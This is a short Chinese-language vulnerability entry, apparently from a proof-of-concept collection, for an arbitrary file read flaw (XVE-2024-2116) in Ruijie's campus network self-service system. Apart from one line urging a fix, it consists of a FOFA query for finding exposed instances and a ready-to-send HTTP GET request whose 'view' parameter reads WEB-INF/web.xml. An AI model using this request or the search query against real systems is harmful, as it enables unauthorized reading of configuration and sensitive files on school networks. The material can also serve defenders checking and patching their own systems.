## 锐捷校园网自助服务系统login_judge.jsf任意文件读取漏洞(XVE-2024-2116)

校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login_judge.jsf 接口处存在任意文件读取漏洞，经过分析和研判，该漏洞利用难度低，可导致敏感信息泄漏，建议尽快修复。

## fofa

```
body="校园网自助服务系统"
```

## poc

```
GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240609163957648](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406091639825.png)